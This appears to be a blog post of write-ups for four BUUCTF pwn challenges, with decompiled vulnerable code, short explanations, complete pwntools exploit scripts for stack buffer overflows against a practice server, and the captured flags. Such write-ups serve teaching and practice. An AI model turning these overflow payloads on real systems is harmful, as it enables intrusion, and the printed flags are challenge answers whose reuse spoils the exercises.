---
title: "Write-ups: BUUCTF"
published: 2025-07-05
updated: 2025-07-05
description: "Write-ups for BUUCTF's pwn aspect."
image: "./covers/buuctf.png"
tags: ["Pwn", "Write-ups"]
category: "Write-ups"
draft: false
---

# rip

## Information

- Category: Pwn
- Points: 1

## Write-up

丢给 IDA 老婆分析，看到有一个危险函数 `gets`，还有一个 `fun` 会返回 `system("/bin/sh")`，保护全关。直接打，注意栈对齐。

## Exploit

```python
#!/usr/bin/python

from pwn import ROP, args, context, flat, gdb, process, remote

gdbscript = """
b *main+32
b *main+67
c
"""

FILE = "./pwn1"
HOST, PORT = "node5.buuoj.cn", 27889

context(log_level="debug", binary=FILE, terminal="kitty")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)

    if args.D:
        gdb.attach(target, gdbscript=gdbscript)

    return target


def construct_payload():
    elf = context.binary
    rop = ROP(elf)

    payload = flat(b"A" * 0x17, rop.ret.address, elf.symbols["fun"])

    return payload


def main():
    target = launch()
    payload = construct_payload()

    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `flag{840e6d55-5582-4995-a345-79f37e63db00}`

# warmup_csaw_2016

## Information

- Category: Pwn
- Points: 1

## Write-up

`int sprintf(char* buffer, const char* format, ...);` 函数将格式化后的数据写入缓冲区，返回值是写入的字符数，不包括末尾的空字符 `\0`。`snprintf` 加入了缓冲区大小检查以及自动截断，比 `sprintf` 更安全，虽然本题没考这个函数的安全性问题。

这里 `vuln` 的地址将被写入 buffer `s`，然后 `write` 负责将 buffer `s` 中前九个字节，也就是 `vuln` 的地址输出到标准输出。

`main` 返回的是 `gets`，我们通过这个 `gets` 覆盖返回地址，修改为白送的 `vuln` 的地址即可。

```c del={11}
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char s[64]; // [rsp+0h] [rbp-80h] BYREF
  _BYTE v5[64]; // [rsp+40h] [rbp-40h] BYREF

  write(1, "-Warm Up-\n", 0xAuLL);
  write(1, "WOW:", 4uLL);
  sprintf(s, "%p\n", vuln);
  write(1, s, 9uLL);
  write(1, ">", 1uLL);
  return gets(v5);
}
```

```c
int vuln()
{
  return system("cat flag.txt");
}
```

## Exploit

```python
#!/usr/bin/python

from pwn import args, context, flat, gdb, process, remote

gdbscript = """
b *main+70
b *main+129
c
"""

FILE = "./pwn-patched"
HOST, PORT = "node5.buuoj.cn", 26553

context(log_level="debug", binary=FILE, terminal="kitty")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)

    if args.D:
        gdb.attach(target, gdbscript=gdbscript)

    return target


def construct_payload(leaked_addr):
    payload = flat(b"A" * 0x48, leaked_addr)

    return payload


def main():
    target = launch()

    target.recvuntil(b"WOW:")
    leaked_addr = int(target.recvline().strip(), 16)

    payload = construct_payload(leaked_addr)

    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `flag{25bcbfc0-3b7e-4261-b957-297bf39c1bfd}`

# ciscn_2019_n_1

## Information

- Category: Pwn
- Points: 1

## Write-up

通过 `gets` 将 `v2` 篡改为 `11.28125` 即可。

```c ins={9-10} del={8}
int func()
{
  _BYTE v1[44]; // [rsp+0h] [rbp-30h] BYREF
  float v2; // [rsp+2Ch] [rbp-4h]

  v2 = 0.0;
  puts("Let's guess the number.");
  gets(v1);
  if ( v2 == 11.28125 )
    return system("cat /flag");
  else
    return puts("Its value should be 11.28125");
}
```

第一次接触小数的处理问题，调试的时候，可以使用 `p/f $xmm0` 来查看这个寄存器的值，同理，使用 `p` 指令加上强制转换和解引用，可以检查地址处保存的小数值：

```asm wrap=false showLineNumbers=false
pwndbg> p/f $xmm0
$1 = {
  v8_bfloat16 = {-0, 11.25, 0, 0, 0, 0, 0, 0},
  v8_half = {-0, 2.6016, 0, 0, 0, 0, 0, 0},
  v4_float = {11.28125, 0, 0, 0},
  v2_double = {5.404878958234834e-315, 0},
  v16_int8 = {0, -128, 52, 65, 0 <repeats 12 times>},
  v8_int16 = {-0, 2.6016, 0, 0, 0, 0, 0, 0},
  v4_int32 = {11.28125, 0, 0, 0},
  v2_int64 = {5.404878958234834e-315, 0},
  uint128 = 3.98770131343430171379e-4942
}
pwndbg> p/f $xmm0.v4_int32[0]
$2 = 11.28125
pwndbg> p *(float *)($rbp - 4)
$3 = 11.28125
```

## Exploit

```python
#!/usr/bin/python

from pwn import args, context, flat, gdb, process, remote, struct

gdbscript = """
b *func+58
c
"""

FILE = "./ciscn_2019_n_1"
HOST, PORT = "node5.buuoj.cn", 25637

context(log_level="debug", binary=FILE, terminal="kitty")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)

    if args.D:
        gdb.attach(target, gdbscript=gdbscript)

    return target


def construct_payload():
    payload = flat(b"A" * 0x2C, struct.pack("<f", 11.28125))

    return payload


def main():
    target = launch()

    payload = construct_payload()

    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `flag{7fd050d8-bfa7-44bc-b98b-a4ee709fea28}`

# pwn1_sctf_2016

## Information

- Category: Pwn
- Points: 1

## Write-up

```c ins={12} del={18, 25-26}
int vuln()
{
  const char *v0; // eax
  int v2; // [esp+8h] [ebp-50h]
  char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF
  _BYTE v4[4]; // [esp+3Ch] [ebp-1Ch] BYREF
  _BYTE v5[7]; // [esp+40h] [ebp-18h] BYREF
  char v6; // [esp+47h] [ebp-11h] BYREF
  _BYTE v7[7]; // [esp+48h] [ebp-10h] BYREF
  _BYTE v8[5]; // [esp+4Fh] [ebp-9h] BYREF

  printf("Tell me something about yourself: ");
  fgets(s, 32, edata);
  std::string::operator=(&input, s);
  std::allocator<char>::allocator(&v6);
  std::string::string(v5, "you", &v6);
  std::allocator<char>::allocator(v8);
  std::string::string(v7, "I", v8);
  replace((std::string *)v4, (std::string *)&input, (std::string *)v7);
  std::string::operator=(&input, v4, v2, v5);
  std::string::~string(v4);
  std::string::~string(v7);
  std::allocator<char>::~allocator(v8);
  std::string::~string(v5);
  std::allocator<char>::~allocator(&v6);
  v0 = (const char *)std::string::c_str((std::string *)&input);
  strcpy(s, v0);
  return printf("So, %s\n", s);
}
```

从上面代码可知，`fegts` 读取了 32 个字符到 buffer `s`，其中 `\0` 占了一个位置，所以我们可以输入的有 31 个字符。

接着，`replace` 会将 buffer `s` 中的字符 `I` 替换为 `you`，返回修改后的字符串，赋给 `input`；`v0` 是 `input.c_str()` 的结果，其中 `c_str()` 的功能是 `Returns a pointer to a null-terminated character array with data equivalent to those stored in the string.` 这个结果被 `strcpy` 复制到 buffer `s`，由于 `strcpy` 不会检查 buffer 大小，所以可能造成溢出，溢出后我们篡改返回地址返回到后门函数 `get_flag` 即可。

这个 `replace` 函数怎么说呢……反正我是没自己读反编译的代码，没学过 `C++`，看着头好大……我做这题的时候刚开始是看见 `vuln` 中有涉及 `replace` 的字眼，就觉得可能会对字符串做一些替换修改的操作吧。接着看到代码中出现的 `you`，`I` 这样的字符串常量，直接运行程序拿这些内容去试试，发现输入 `I` 会被替换成 `you`，那 `replace` 的作用不用看也猜得差不多了。最后，闲的没事，我让 GPT 分析了一下 `replace` 的功能，和猜的也差不多。太菜了呜呜呜……

```cpp collapse={4-45}
std::string *__stdcall replace(std::string *a1, std::string *a2, std::string *a3)
{
  int v4; // [esp+Ch] [ebp-4Ch]
  _BYTE v5[4]; // [esp+10h] [ebp-48h] BYREF
  _BYTE v6[7]; // [esp+14h] [ebp-44h] BYREF
  char v7; // [esp+1Bh] [ebp-3Dh] BYREF
  int v8; // [esp+1Ch] [ebp-3Ch]
  _BYTE v9[4]; // [esp+20h] [ebp-38h] BYREF
  int v10; // [esp+24h] [ebp-34h] BYREF
  int v11; // [esp+28h] [ebp-30h] BYREF
  char v12; // [esp+2Fh] [ebp-29h] BYREF
  _DWORD v13[2]; // [esp+30h] [ebp-28h] BYREF
  _BYTE v14[4]; // [esp+38h] [ebp-20h] BYREF
  int v15; // [esp+3Ch] [ebp-1Ch]
  _BYTE v16[4]; // [esp+40h] [ebp-18h] BYREF
  int v17; // [esp+44h] [ebp-14h] BYREF
  _BYTE v18[4]; // [esp+48h] [ebp-10h] BYREF
  _BYTE v19[8]; // [esp+4Ch] [ebp-Ch] BYREF

  while ( std::string::find(a2, a3, 0) != -1 )
  {
    std::allocator<char>::allocator(&v7);
    v8 = std::string::find(a2, a3, 0);
    std::string::begin((std::string *)v9);
    __gnu_cxx::__normal_iterator<char *,std::string>::operator+(&v10);
    std::string::begin((std::string *)&v11);
    std::string::string<__gnu_cxx::__normal_iterator<char *,std::string>>(v6, v11, v10, &v7);
    std::allocator<char>::~allocator(&v7);
    std::allocator<char>::allocator(&v12);
    std::string::end((std::string *)v13);
    v13[1] = std::string::length(a3);
    v15 = std::string::find(a2, a3, 0);
    std::string::begin((std::string *)v16);
    __gnu_cxx::__normal_iterator<char *,std::string>::operator+(v14);
    __gnu_cxx::__normal_iterator<char *,std::string>::operator+(&v17);
    std::string::string<__gnu_cxx::__normal_iterator<char *,std::string>>(v5, v17, v13[0], &v12);
    std::allocator<char>::~allocator(&v12);
    std::operator+<char>((std::string *)v19);
    std::operator+<char>((std::string *)v18);
    std::string::operator=(a2, v18, v5, v4);
    std::string::~string(v18);
    std::string::~string(v19);
    std::string::~string(v5);
    std::string::~string(v6);
  }
  std::string::string(a1, a2);
  return a1;
}
```

## Exploit

```python
#!/usr/bin/python

from pwn import args, context, flat, gdb, process, remote

gdbscript = """
b *vuln+42
c
"""

FILE = "./pwn1_sctf_2016"
HOST, PORT = "node5.buuoj.cn", 28688

context(log_level="debug", binary=FILE, terminal="kitty")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)

    if args.D:
        gdb.attach(target, gdbscript=gdbscript)

    return target


def construct_payload():
    elf = context.binary

    payload = flat(b"I" * 21 + b"A", elf.symbols["get_flag"])

    return payload


def main():
    target = launch()

    payload = construct_payload()

    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `flag{db1e1ee0-907b-497b-85eb-9fe936bf26e7}`
